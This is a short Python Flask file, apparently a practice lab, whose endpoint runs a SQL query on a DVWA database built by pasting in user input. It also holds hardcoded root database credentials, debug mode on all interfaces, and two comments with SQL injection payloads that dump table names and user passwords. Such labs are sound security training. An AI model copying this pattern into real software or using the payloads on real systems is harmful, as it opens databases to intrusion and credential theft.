from sqlalchemy import create_engine
from flask import Flask, render_template, jsonify, request, abort
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'


@app.route("/api/sqlquery", methods=["POST"])
def list_add_user():
    if request.method == 'POST':
        req = request.get_json()["user_id"]
        # ip = input()
        print(req)
        query = "SELECT first_name,last_name FROM users where user_id = "+req
        # query = req
        print(query)
        engine = create_engine(
            "mysql+pymysql://root:123456@172.22.0.2:3306/dvwa")
        y = []
        with engine.connect() as con:
            x = con.execute(query)
            for ln in x:
                y.append(list(ln))
        return {"res": y}, 200
    else:
        return 405


if __name__ == '__main__':
    app.debug = True
    app.run(port=8082, host='0.0.0.0')

# 1 or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
# 1 or '0'='0' union select user, password from dvwa.users #
